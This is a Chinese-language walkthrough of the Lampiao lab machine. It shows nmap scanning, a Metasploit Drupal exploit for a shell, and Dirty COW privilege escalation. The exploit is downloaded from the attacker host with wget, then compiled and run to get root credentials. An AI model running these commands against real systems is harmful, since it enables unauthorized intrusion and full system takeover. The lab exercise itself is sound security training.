### 0x01 主机扫描，获取IP

```shell
nmap -sn 192.168.12.0/24

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 18:47 CST
Nmap scan report for 192.168.12.1
Host is up (0.00013s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.12.2
Host is up (0.00018s latency).
MAC Address: 00:50:56:E9:00:06 (VMware)
Nmap scan report for 192.168.12.129
Host is up (0.00015s latency).
MAC Address: 00:0C:29:D7:B6:FC (VMware)
Nmap scan report for 192.168.12.136
Host is up (0.00024s latency).
MAC Address: 00:0C:29:04:DF:AF (VMware)
Nmap scan report for 192.168.12.254
Host is up (0.00012s latency).
MAC Address: 00:50:56:F6:E6:00 (VMware)
Nmap scan report for 192.168.12.135
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.03 seconds

```

> 可以发现`192.168.12.136`为新主机，也就是Lampiao主机

### 0x02 端口扫描

```shell
nmap -p 1-65535 192.168.12.136

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1898/tcp open  cymtec-port
```

> 开放了80、22、1898端口

### 0x03 访问

1、访问`http://192.168.12.136/`，使用御剑进行后台扫描

> 无结果

2、访问`http://192.168.12.136:1898/`，使用御剑进行后台扫描

> 后面发现没啥用

![image-20230223190119582](https://s2.loli.net/2023/02/27/vcQDxLV5jspSu3i.png)

### 0x04 使用AWVS扫描 

```
信息: 
Current Drupal version: 7.54.

这个版本下的Drupal有以下漏洞:
CVE-2019-6341
CVE-2019-11358
CVE-2019-11831
CVE-2017-6932
CVE-2017-6929
CVE-2017-6928
CVE-2017-6927
CVE-2019-6339
CVE-2018-1000888
CVE-2018-7600
CVE-2018-7602
CVE-2017-6922

```

### 0x05 使用msf获得shell

```shell
search Drupal		# 查找可用模块
```

![image-20230223230703955](https://s2.loli.net/2023/02/27/maS3fjXThQ8xBUs.png)

```shell
use 1		# 选择模块
show options		# 查看参数		
set rhost 192.168.12.136		# 设置远端IP
set rport 1898		# 设置远端端口
run		# 启动模块
```

![image-20230223231129303](https://s2.loli.net/2023/02/27/GtpLlNdb62UxE9B.png)

### 0x06 提权

> 利用AWVS扫出来的漏洞进行提权，找了一大堆，就一个能用的，还是上面getshell用到的，不能提权，略过

脏牛提权

```shell
searchsploit dirty
```

![image-20230223234616017](https://s2.loli.net/2023/02/27/ElhH15ezuDr3jT9.png)

```shell
# 选择linux/local/40847.cpp 文件

# 将文件复制到任意文件夹，进入该文件夹，开启http服务，并指定端口
python -m http.server 8080
```

![image-20230223234932623](https://s2.loli.net/2023/02/27/igobOzK1nDlkx2X.png)

```shell
# 回到msf，进入shell，用wget下载40847.cpp文件
wget http://192.168.12.135:8080/40847.cpp

# 下载成功后编译该文件
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil 

# 执行文件
./40847

# 得到密码为dirtyCowFun
```

![image-20230223235324590](https://s2.loli.net/2023/02/27/hZBH1UnF6crakgA.png)

![image-20230223235352264](https://s2.loli.net/2023/02/27/9QZPVLFekD2CAql.png)

![image-20230223235416505](https://s2.loli.net/2023/02/27/ZVB6ozgRXxApvPb.png)

![image-20230223235607514](https://s2.loli.net/2023/02/27/Qm7AdxqUkNrbvpB.png)

> 成功连接

![image-20230223235658638](https://s2.loli.net/2023/02/27/d7IxV1NgR3C6loZ.png)